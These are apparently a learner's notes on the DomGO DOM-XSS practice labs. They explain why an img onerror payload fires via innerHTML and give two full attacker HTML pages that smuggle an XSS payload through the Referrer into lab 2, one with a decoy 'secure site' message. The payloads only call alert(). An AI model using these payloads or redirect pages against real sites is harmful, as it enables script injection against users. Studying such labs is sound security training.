
# Why `<img>` works when `<script>` does not
- `<script>alert("hi")</script>`
- `img src= "x" onerror=alert("hi")>`
Depending where we are injecting, `<script>` element will not work.
- According to HTML5 specification, `<script>` elements **inserted via `innerHTML` do NOT execute**
- They are parsed but their script content is **not executed**
- This is a security feature to prevent exactly this type of XSS

# Labs DomGO XSS
These are labs to practice XSS vulnerability.

| Level                                    | Technique used               |
| ---------------------------------------- | ---------------------------- |
| [Lab 1](https://domgo.at/cxss/example/1) | Bypassed with img tag on url |
| [Lab 2](https://domgo.at/cxss/example/2) | XSS by Referrer              |
|                                          |                              |
#### Lab 2 
The attack here require us to host our own malicious web page, and create a referrer chain to the target website that will trigger its function.

## Lab 2 Attack Demonstration
1. Host ref.html on any server (github pages, local server)
2. Access the webpage with payload parameter
3. Wait for the re-direct to trigger
4. Target page (example/2) will:
    
    - Get referrer: `http://localhost:8000/attack.html?payload=%3Cimg%20src%3Dx%20onerror%3Dalert('HACKED')%3E`
    - Extract `payload` parameter value
    - Decode to: `<img src=x onerror=alert('HACKED')>`
    - Insert via `innerHTML` → XSS executed!
##### Payload URL Param
```html
<!DOCTYPE html>
<html>
<head>
    <meta name="referrer" content="unsafe-url">
</head>
<body>
    <script>
        // Get payload from current URL or use default
        const urlParams = new URLSearchParams(window.location.search);
        const payload = urlParams.get('payload') || '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E';
        
        // Redirect to target
        setTimeout(() => {
            window.location.href = 'https://domgo.at/cxss/example/2';
        }, 100);
    </script>
</body>
</html>
```
If we want to make even more sneaky, we can hardcode the payload within page using the below, payload. So we can simply trigger by visiting `https://ourwebsite.com/ref2.html` and the payload will be passed silently to the target URL
##### Payload Simple + Sneaky
```html
<html>
<head>
<-- This payload is more sneaky-->
    <meta name="referrer" content="unsafe-url">
    <script>
        // Force payload into this page's URL
        const payload = '<img src=x onerror=alert(document.domain)>';
        const encodedPayload = encodeURIComponent(payload);

        // Update URL to include payload parameter
        const newSearch = window.location.search ?
                         window.location.search + '&payload=' + encodedPayload :
                         '?payload=' + encodedPayload;

        if (!window.location.search.includes('payload=')) {
            history.replaceState(null, '', window.location.pathname + newSearch);
        }

        // Redirect after brief delay
        setTimeout(() => {
            window.location.href = 'https://domgo.at/cxss/example/2';
        }, 500);
    </script>
</head>
<body>
    Redirecting to secure site...
</body>
</html>
```